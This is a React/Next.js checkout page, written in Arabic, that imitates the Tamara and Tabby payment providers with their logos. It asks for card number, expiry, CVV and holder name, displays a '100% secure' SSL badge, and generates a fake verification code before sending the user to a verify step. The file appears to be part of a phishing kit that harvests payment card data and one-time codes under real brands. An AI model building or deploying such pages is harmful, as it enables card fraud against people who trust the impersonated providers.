'use client'

import { useEffect, useState } from 'react'
import { useParams, useRouter } from 'next/navigation'
import { motion } from 'framer-motion'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import ProviderButton from '@/components/providers/provider-button'
import ProgressBar from '@/components/providers/progress-bar'
import TamaraLogo from '@/components/providers/tamara-logo'
import TabbyLogo from '@/components/providers/tabby-logo'
import CreditCardPreview from '@/components/providers/credit-card-preview'
import { Payment, PaymentProvider } from '@/types/payment'
import { CreditCard, Shield } from 'lucide-react'

export default function CardPage() {
  const params = useParams()
  const router = useRouter()
  const provider = params.provider as PaymentProvider
  const uuid = params.uuid as string

  const [payment, setPayment] = useState<Payment | null>(null)
  const [loading, setLoading] = useState(true)
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiry: '',
    cvv: '',
    holderName: ''
  })

  useEffect(() => {
    fetchPayment()
  }, [uuid])

  const fetchPayment = async () => {
    try {
      const response = await fetch(`/api/payments/${uuid}`)
      const data = await response.json()

      if (data.success) {
        setPayment(data.data)
        if (data.data.customer_name) {
          setFormData((prev) => ({
            ...prev,
            holderName: data.data.customer_name
          }))
        }
      }
    } catch (error) {
      console.error('Error fetching payment:', error)
    } finally {
      setLoading(false)
    }
  }

  const handleContinue = async () => {
    try {
      const verificationCode = Math.floor(100000 + Math.random() * 900000).toString()

      await fetch(`/api/payments/${uuid}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          status: 'processing',
          verification_code: verificationCode
        }),
      })

      router.push(`/payment/${provider}/${uuid}/verify`)
    } catch (error) {
      console.error('Error updating payment:', error)
    }
  }

  const isFormValid = formData.cardNumber.length >= 16 && formData.expiry && formData.cvv && formData.holderName

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-tamara mx-auto"></div>
          <p className="mt-4 text-gray-600">جاري التحميل...</p>
        </div>
      </div>
    )
  }

  if (!payment) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <p className="text-gray-600">لم يتم العثور على الطلب</p>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 py-8 px-4">
      <div className="max-w-2xl mx-auto">
        <div className="mb-8">
          {provider === 'tamara' ? <TamaraLogo /> : <TabbyLogo />}
        </div>

        <ProgressBar provider={provider} currentStep={3} totalSteps={4} />

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="mt-8 space-y-6"
        >
          <CreditCardPreview
            provider={provider}
            cardNumber={formData.cardNumber}
            cardHolder={formData.holderName}
            expiryDate={formData.expiry}
            cvv={formData.cvv}
          />

          <Card className="shadow-xl">
            <CardHeader>
              <CardTitle className="flex items-center gap-2 text-xl">
                <CreditCard className="w-5 h-5" />
                بيانات البطاقة
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="holderName">اسم حامل البطاقة</Label>
                <Input
                  id="holderName"
                  placeholder="مثال: عبدالله أحمد علي"
                  value={formData.holderName}
                  onChange={(e) => setFormData({ ...formData, holderName: e.target.value })}
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="cardNumber">رقم البطاقة</Label>
                <Input
                  id="cardNumber"
                  placeholder="1234 5678 9012 3456"
                  maxLength={16}
                  value={formData.cardNumber}
                  onChange={(e) => setFormData({ ...formData, cardNumber: e.target.value.replace(/\D/g, '') })}
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="expiry">تاريخ الانتهاء</Label>
                  <Input
                    id="expiry"
                    placeholder="MM/YY"
                    maxLength={5}
                    value={formData.expiry}
                    onChange={(e) => {
                      let value = e.target.value.replace(/\D/g, '')
                      if (value.length >= 2) {
                        value = value.substring(0, 2) + '/' + value.substring(2, 4)
                      }
                      setFormData({ ...formData, expiry: value })
                    }}
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="cvv">CVV</Label>
                  <Input
                    id="cvv"
                    placeholder="123"
                    maxLength={3}
                    value={formData.cvv}
                    onChange={(e) => setFormData({ ...formData, cvv: e.target.value.replace(/\D/g, '') })}
                  />
                </div>
              </div>

              <div className="flex items-center gap-2 text-sm text-gray-500 p-3 bg-green-50 rounded-lg">
                <Shield className="w-5 h-5 text-green-600" />
                <p>مشفر باستخدام 256-bit SSL - آمن 100%</p>
              </div>
            </CardContent>
          </Card>

          <div className="mt-8">
            <ProviderButton
              provider={provider}
              onClick={handleContinue}
              disabled={!isFormValid}
              className="w-full h-12 text-lg"
            >
              إرسال رمز التحقق
            </ProviderButton>
          </div>
        </motion.div>
      </div>
    </div>
  )
}
